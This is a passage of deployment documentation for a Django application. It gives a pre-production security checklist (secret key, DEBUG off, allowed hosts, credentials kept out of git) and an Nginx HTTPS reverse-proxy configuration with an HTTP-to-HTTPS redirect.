        run: docker compose down -v

docs.title: Required before production
docs.text:
• [ ] SECRET_KEY — unique, at least 50 characters, not "django-insecure-..."
  • [ ] DEBUG = False — never True in production
  • [ ] ALLOWED_HOSTS — specific domains, not ['*']
  • [ ] CSRF_TRUSTED_ORIGINS — includes your domain
  • [ ] DATABASE_URL — PostgreSQL with a strong password (not notes_password)
  • [ ] REDIS_URL — Redis for the channel layer (InMemory does not scale)
  • [ ] .env in .gitignore — never commit credentials
  • [ ] entrypoint.sh — remove --reload from Uvicorn
  • [ ] SEED_DEMO_DATA — not set, or remove --force

SECURE_HSTS_SECONDS = 31536000  # the browser remembers HTTPS for 1 year

docs.title: Nginx in production (with SSL)
docs.text:
server {
    listen 443 ssl;
    server_name your-domain.com;

    ssl_certificate     /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    location /static/ {
        alias /staticfiles/;
        expires 7d;
    }

    location / {
        proxy_pass http://django;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
        proxy_set_header Host $host;
        proxy_read_timeout 300s;
    }
}

server {
    listen 80;
    server_name your-domain.com;
    return 301 https://$host$request_uri;  # HTTP → HTTPS redirect
}
